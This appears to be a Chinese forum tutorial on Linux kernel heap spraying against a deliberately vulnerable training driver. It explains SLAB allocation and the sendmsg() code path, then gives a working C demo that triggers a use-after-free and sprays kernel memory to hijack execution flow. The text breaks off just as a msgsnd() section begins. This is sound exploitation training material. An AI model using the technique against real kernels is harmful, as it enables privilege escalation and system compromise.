
# [原创]Linux内核堆喷（Linux Kernel Heap Spray）

基于：`vulnerable_linux_drive`（类似windows著名的的HEVD）

驱动地址：`a09K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6A6L8Y4k6A6j5%4c8#2M7#2)9J5k6o6m8^5z5e0m8Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3I4W2i4K6g2X3L8r3W2F1N6i4S2Q4y4h3k6V1M7X3W2$3k6i4t1`.

## What is Linux Kernel Heap Spray？

将Shellcode与大量的slide code（滑板指令）相组合，组成一整个 **注入代码段** ，然后向系统申请大量的内存空间，并反复用 **注入代码段** 填充，然后将程序执行流劫持到内核堆上，使得程序慢慢“滑”向SHellcode。

Slide code一般使用：

1. NOP指令（`\x90`）
2. `\x0c`
3. `\x0d`

他们均不会影响shellcode的执行。

## Basic linux kernel memory management

### Intro to SLAB

SLAB作为用户linux系统内核对于小对象的高速cache。

`cat /proc/slabinfo` 可以查看当前 slab 对象的分配情况。
如：

```text
Acpi-Namespace 7854 7854 40 102 1 : tunables 0 0 0 : slabdata 77 77 0
numa_policy 186 186 264 62 4 : tunables 0 0 0 : slabdata 3 3 0
trace_event_file 1426 1426 88 46 1 : tunables 0 0 0 : slabdata 31 31 0
ftrace_event_field 3400 3400 48 85 1 : tunables 0 0 0 : slabdata 40 40 0
radix_tree_node 13694 15848 584 56 8 : tunables 0 0 0 : slabdata 283 283 0
task_group 168 168 576 56 8 : tunables 0 0 0 : slabdata 3 3 0
dma-kmalloc-8192 0 0 8192 4 8 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-4096 0 0 4096 8 8 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-2048 0 0 2048 16 8 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-1024 0 0 1024 32 8 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-512 64 64 512 64 8 : tunables 0 0 0 : slabdata 1 1 0
dma-kmalloc-256 0 0 256 64 4 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-128 0 0 128 64 2 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-64 0 0 64 64 1 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-32 0 0 32 128 1 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-16 0 0 16 256 1 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-8 0 0 8 512 1 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-192 0 0 192 42 2 : tunables 0 0 0 : slabdata 0 0 0
dma-kmalloc-96 0 0 96 42 1 : tunables 0 0 0 : slabdata 0 0 0
kmalloc-8192 410 420 8192 4 8 : tunables 0 0 0 : slabdata 105 105 0
kmalloc-4096 342 360 4096 8 8 : tunables 0 0 0 : slabdata 45 45 0
kmalloc-2048 2478 2528 2048 16 8 : tunables 0 0 0 : slabdata 158 158 0
kmalloc-1024 5980 6304 1024 32 8 : tunables 0 0 0 : slabdata 197 197 0
kmalloc-512 41282 41792 512 64 8 : tunables 0 0 0 : slabdata 653 653 0
kmalloc-256 7786 8000 256 64 4 : tunables 0 0 0 : slabdata 125 125 0
kmalloc-192 6174 6174 192 42 2 : tunables 0 0 0 : slabdata 147 147 0
kmalloc-128 2240 2240 128 64 2 : tunables 0 0 0 : slabdata 35 35 0
kmalloc-96 7455 9786 96 42 1 : tunables 0 0 0 : slabdata 233 233 0
kmalloc-64 23669 24192 64 64 1 : tunables 0 0 0 : slabdata 378 378 0
kmalloc-32 31701 32640 32 128 1 : tunables 0 0 0 : slabdata 255 255 0
kmalloc-16 13568 13568 16 256 1 : tunables 0 0 0 : slabdata 53 53 0
kmalloc-8 12288 12288 8 512 1 : tunables 0 0 0 : slabdata 24 24 0
kmem_cache_node 1920 1920 64 64 1 : tunables 0 0 0 : slabdata 30 30 0
kmem_cache 1890 1890 384 42 4 : tunables 0 0 0 : slabdata 45 45 0
```

其中 `kmalloc-8` 代表：首先，他是一个普通的（非专用slab），里面的对象都是8B，当你申请1到8B时会从这里给你返回一个cache对象，当你`kfree`掉他时，这个`free_cache`会回到`kmalloc-8`的SLAB里面。（类比用户态有点像一个本身就有chunk的fastbin？）

与用户态相似的，当free掉一个SLAB对象时，仅仅是标free，并且slab优先分配最后被free的对象。
而slab对象受到 `kmem_cache` 的管理（比如说`kmalloc-8`）。

其管理层级结构如下：

![](upload/attach/202012/876323_HZJYYXB65GE6M4Y.jpg)

并且用户可以通过：`kmem_cache_create` 创建一个自己的 `kmem_cache` 数据结构。

## How to trigger Kernel heap spray?

### Using `sendmsg()`

函数原型：

```c
static int ____sys_sendmsg(struct socket *sock, struct msghdr *msg_sys,
    unsigned int flags, struct used_address *used_address,
    unsigned int allowed_msghdr_flags)
```

主要用于发送消息到另一个套接字，比如：在不同的进程之间传递文件描述符（file descriptor）
源码如下 ：

```c
struct msghdr {
    void *msg_name; /* ptr to socket address structure */
    int msg_namelen; /* size of socket address structure */
    struct iov_iter msg_iter; /* data */
    void *msg_control; /* ancillary data */
    __kernel_size_t msg_controllen; /* ancillary data buffer length */
    unsigned int msg_flags; /* flags on received message */
    struct kiocb *msg_iocb; /* ptr to iocb for async requests */
};
```

https://elixir.bootlin.com/linux/v4.4.31/source/net/socket.c

```c
static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,
    struct msghdr *msg_sys, unsigned int flags,
    struct used_address *used_address)
{
    struct compat_msghdr __user *msg_compat =
        (struct compat_msghdr __user *)msg;
    struct sockaddr_storage address;
    struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
    unsigned char ctl[sizeof(struct cmsghdr) + 20]
        __attribute__ ((aligned(sizeof(__kernel_size_t)))); //在栈上开44字节
    /* 20 is size of ipv6_pktinfo */
    unsigned char *ctl_buf = ctl; //ctl_buf指向ctl.
    int ctl_len;
    ssize_t err;

    msg_sys->msg_name = &address;

    if (MSG_CMSG_COMPAT & flags)
        err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
    else
        err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov); //这里将用户态的msghdr(消息头)拷贝到内核态的msg_sys
    if (err < 0)
        return err;

    err = -ENOBUFS;
    if (msg_sys->msg_controllen > INT_MAX) //
        goto out_freeiov;

    ctl_len = msg_sys->msg_controllen; //当msg_sys->msg_controllen小于等于INT_MAX，会将ctl_len设置成msg_sys->msg_controllen（）
    if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
        err =
            cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl,
                        sizeof(ctl));
        if (err)
            goto out_freeiov;
        ctl_buf = msg_sys->msg_control;
        ctl_len = msg_sys->msg_controllen;
    } else if (ctl_len) {
        if (ctl_len > sizeof(ctl)) { //当ctl_len>ctl（44字节）时
            ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL); //调用kmalloc 分配 ctl_len 大小的堆块
            if (ctl_buf == NULL)
                goto out_freeiov;
        }
        err = -EFAULT;
        /*
         * Careful! Before this, msg_sys->msg_control contains a user pointer.
         * Afterwards, it will be a kernel pointer. Thus the compiler-assisted
         * checking falls down on this.
         */
        if (copy_from_user(ctl_buf,
                    (void __user __force *)msg_sys->msg_control,
                    ctl_len)) //这里使用copy_from_user将用户态的msg_sys->msg_control,拷贝到内核的ctl_buf(由kmalloc产生)，拷贝长度ctl_len。这里内容可控
            goto out_freectl;
        msg_sys->msg_control = ctl_buf;
    }
    msg_sys->msg_flags = flags;

    ......
}
```

#### DEMO

```c
#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include "/root/vulnerable_linux_driver/src/vuln_driver.h"

#define SIZE 84

int main(){
    char buf[SIZE];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    int fd = open("/dev/vulnerable_device",O_RDWR);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    // filled with 0x61 'a'
    memset(buf,0x61,sizeof(buf));

    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = SIZE;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);

    // trigger UAF
    ioctl(fd,ALLOC_UAF_OBJ,NULL); //alloc_uaf_obj
    ioctl(fd,FREE_UAF_OBJ,NULL); //free uaf obj

    /* Heap spray */
    for(int i = 0; i < 100000; i++) {
        sendmsg(sockfd, &msgh, 0);
    }

    /* Trigger */
    ioctl(fd, USE_UAF_OBJ, NULL);

    return 0;
}
```

首先做一次UAF，然后练习100000调用`sendmsg`，参数中的`msgh`是我们用户态的东西。

![](upload/attach/202012/876323_4WS8VN9RTAKFZ7F.jpg)

将user space的`controllen`大小（84）赋值给`ctl_len`.

![](upload/attach/202012/876323_K7SF8XF4575F6BB.jpg)

检测到大于`0x44`，重新调用`kmalloc`从专用SLAB中开内存

![](upload/attach/202012/876323_A9V7CD7WWD4APUW.jpg)

最后把用户态的内容拷贝到内核中。`ctl_buf`是`kmalloc`出的。

**之后多次调用，完成大量申请空间并填充。**

![](upload/attach/202012/876323_TAEC9BECJKPTEVQ.jpg)

**可以看到程序的执行流流向了我们填充的`0x61`，至此，堆喷成功。**

### Using `msgsnd()`

源码：

```c
SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
        int, msgflg)
{
    long mtype;
```
